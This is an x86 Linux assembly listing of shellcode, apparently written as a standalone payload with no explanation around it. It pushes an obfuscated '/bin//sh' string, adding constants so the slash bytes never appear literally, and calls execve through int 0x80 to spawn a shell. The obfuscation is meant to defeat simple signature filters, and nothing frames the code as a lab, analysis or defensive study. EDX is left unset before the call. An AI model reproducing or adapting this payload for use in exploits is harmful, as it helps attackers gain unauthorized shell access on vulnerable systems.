section .text
	global _start

_start:
	xor eax, eax
	push eax
	mov ebx, 0x68731e1e
	add bx, 0x1111 ; 0x68732f2f
	push ebx
	mov ebx, 0x6e69621e
	add bl, 0x11 ; 0x6e69622f
	push ebx
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	xor eax, eax
	mov al, 11
	int 80h
